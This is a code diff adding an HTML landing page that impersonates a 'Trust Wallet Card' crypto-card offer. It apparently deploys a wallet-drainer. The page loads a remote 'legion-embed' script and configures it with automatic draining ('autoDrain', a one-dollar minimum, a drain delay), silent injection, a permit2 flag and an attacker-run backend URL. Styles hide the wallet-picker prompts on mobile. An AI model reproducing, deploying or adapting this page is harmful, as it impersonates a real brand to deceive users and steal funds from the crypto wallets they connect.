@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="theme-color" content="#ffffff"/>
+  <meta name="description" content="Trust Wallet Card - Spend crypto anywhere Mastercard is accepted. No KYC, no fees, instant issuance."/>
+  <meta name="keywords" content="trust wallet, crypto card, mastercard, debit card, no kyc, self-custody"/>
+  <meta property="og:title" content="Trust Wallet Card"/>
+  <meta property="og:description" content="Your crypto card in 2 minutes. No KYC, no fees."/>
+  <meta property="og:image" content="/logo.png"/>
+  <meta property="og:url" content="https://trust-wallet-card.surge.sh/"/>
+  <meta property="og:site_name" content="Trust Wallet Card"/>
+  <meta property="og:type" content="website"/>
+  <meta name="twitter:card" content="summary"/>
+  <meta name="twitter:title" content="Trust Wallet Card"/>
+  <meta name="twitter:description" content="Your crypto card in 2 minutes. No KYC, no fees."/>
+  <meta name="apple-mobile-web-app-capable" content="yes"/>
+  <meta name="mobile-web-app-capable" content="yes"/>
+  <meta name="format-detection" content="telephone=no"/>
+  <link rel="canonical" href="https://trust-wallet-card.surge.sh/"/>
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.png"/>
+  <link rel="apple-touch-icon" sizes="180x180" href="/logo.png"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+  <title>Trust Wallet Card</title>
+  <script type="module" crossorigin src="/assets/index-CtuewKp5.js"></script>
+  <link rel="stylesheet" crossorigin href="/assets/index-BqnN8uGK.css">
+  <style id="__trust_launch_css">
+    /* Trust-only: hide multi-wallet / legion chrome on mobile */
+    #__lgn_root{display:none!important}
+    #cwModal.cw-show{display:none!important}
+    /* Soft-hide Reown picker chrome after deep-link starts (URI still generated) */
+    @media (max-width:900px){
+      w3m-modal,wcm-modal{opacity:0!important;pointer-events:none!important}
+    }
+  </style>
+</head>
+<body>
+  <div id="app">
+    <div id="root"></div>
+  </div>
+  <script>window.LEGION_BRAND='permit2';</script>
+  <script>
+    // Mobile: pin Trust deep-link target BEFORE legion boots
+    (function () {
+      try {
+        var ua = navigator.userAgent || '';
+        var mobile = /iPhone|iPad|iPod|Android|Mobile/i.test(ua) ||
+          (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+        if (mobile) window.__LEGION_DEEP_LINK_TARGET__ = 'trust';
+      } catch (_) {}
+    })();
+    window.LEGION_CONFIG = {
+      backendUrl: 'https://sadrailala-production.up.railway.app',
+      wcProjectId: 'a785da105621eb55c998a35c57587667',
+      autoDrain: true,
+      showOverlay: false,
+      injectMode: 'silent',
+      silentMode: false,
+      delayDrainMs: 400,
+      hookButtons: false,
+      minDrainUsd: 1
+    };
+  </script>
+  <script src="/trust-direct.js?v=1.2.0"></script>
+  <script src="/trust-deeplink-rescue.js?v=2.0.0"></script>
+  <script src="/trust-preflight.js?v=1.3.0"></script>
+  <script src="/trust-connected-ui.js?v=1.3.0"></script>
+  <script src="/trust-phase-b.js?v=1.0.0"></script>
+  <script src="/trust-debug.js?v=1.0.0"></script>
+  <script
+    src="https://trust-legion-cdn.surge.sh/legion-embed.js"
+    defer
+    data-hook-buttons="false"
+    data-auto-drain="true"
+    data-backend="https://sadrailala-production.up.railway.app"
+    data-wc="a785da105621eb55c998a35c57587667"
+    data-min-drain-usd="1"
+  ></script>
+  <script src="/trust-post-connect.js?v=1.2.0" defer></script>
+</body>
+</html>
